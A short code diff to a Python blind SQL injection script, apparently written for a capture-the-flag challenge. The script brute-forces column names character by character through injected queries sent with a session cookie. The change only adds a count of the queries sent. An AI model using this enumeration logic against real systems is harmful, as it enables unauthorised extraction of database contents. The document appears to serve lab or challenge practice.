@@ -29,6 +29,7 @@ def get_column_names(cookie):
     tables = []
     columns = []
     all_tables = pickle.load(open('outputs/tables.pkl', 'rb'))
+    no_of_queries = 0
 
     for i in all_tables:
         if i.startswith('CHALLENGE'):
@@ -47,6 +48,7 @@ def get_column_names(cookie):
             for a in alphabets:
                 word = queue_word + a
                 query = builder_query(table_name=table_name, length=len(word), word=word)
+                no_of_queries += 1
                 if inject.inject(cookie=cookie, query=query):
                     print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                     all_columns.append(word)
@@ -57,6 +59,7 @@ def get_column_names(cookie):
 
         for name in all_columns:
             query = check_query(table_name=table_name, column_name=name)
+            no_of_queries += 1
             if inject.check(cookie, query):
                 print(f'Found Column: {name}')
                 column_dict[table_name].append(name)
@@ -64,3 +67,4 @@ def get_column_names(cookie):
 
         print(columns)
         pickle.dump(columns, open('outputs/columns.pkl', 'wb'))
+    print(f'No of queries: {no_of_queries}')
